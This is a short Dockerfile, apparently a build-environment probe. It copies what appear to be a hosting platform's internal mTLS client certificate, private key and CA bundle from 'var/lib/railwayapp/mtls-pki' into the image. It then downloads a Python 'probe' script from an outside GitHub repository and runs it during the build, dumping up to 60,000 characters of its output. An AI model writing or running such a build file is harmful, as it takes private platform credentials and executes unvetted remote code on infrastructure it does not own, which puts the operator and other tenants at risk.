# MARK-I68262-q1-6f3a91
FROM alpine:3.20
RUN echo MARK-I68262-q1-6f3a91-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 30 -o /p.py "https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i68262.py?v=6f3a91" && echo DL_OK && MARK=I68262-q1-6f3a91 timeout 520 python3 /p.py 2>&1 | head -c 60000
